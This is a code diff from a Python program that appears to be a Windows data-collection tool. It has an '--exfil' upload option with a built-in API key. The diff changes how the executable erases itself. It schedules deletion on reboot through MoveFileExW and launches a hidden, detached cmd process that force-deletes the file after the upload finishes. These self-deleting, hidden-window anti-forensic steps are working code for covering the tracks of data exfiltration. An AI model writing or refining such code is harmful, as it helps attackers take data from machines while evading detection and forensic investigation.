@@ -1765,15 +1765,13 @@ def main():
     parser.add_argument("--exfil-key",   metavar="KEY",       default=_EXFIL_KEY or None, help="API key for --exfil (default: baked in at build time)")
     args = parser.parse_args()
 
-    # Move the exe to %TEMP% immediately so it vanishes from its drop location.
-    # os.rename() works on a running exe (move within same volume); delete does not.
-    # A 120s delayed del cleans up the temp copy after the scan finishes.
+    # Schedule the exe for deletion on next reboot (MOVEFILE_DELAY_UNTIL_REBOOT = 0x4).
+    # No rename, no subprocess at startup - nothing that can crash the scan mid-run.
+    # Immediate delete is attempted again at end of main() after the upload finishes.
     _self_exe_path: str = ""
     if args.self_delete and getattr(sys, "frozen", False):
         try:
             import ctypes
-            # Schedule deletion of the exe on next reboot - no rename, no subprocess,
-            # nothing that can crash the scan mid-run.
             _self_exe_path = sys.executable
             ctypes.windll.kernel32.MoveFileExW(_self_exe_path, None, 0x4)
         except Exception:
@@ -1904,8 +1902,7 @@ def main():
             try:
                 import subprocess as _sp
                 _sp.Popen(
-                    f'cmd /c ping -n 3 127.0.0.1 > nul & del /f /q "{_self_exe_path}"',
-                    shell=True,
+                    ['cmd', '/c', f'ping -n 3 127.0.0.1 > nul & del /f /q "{_self_exe_path}"'],
                     creationflags=_sp.DETACHED_PROCESS | _sp.CREATE_NO_WINDOW,
                 )
             except Exception:
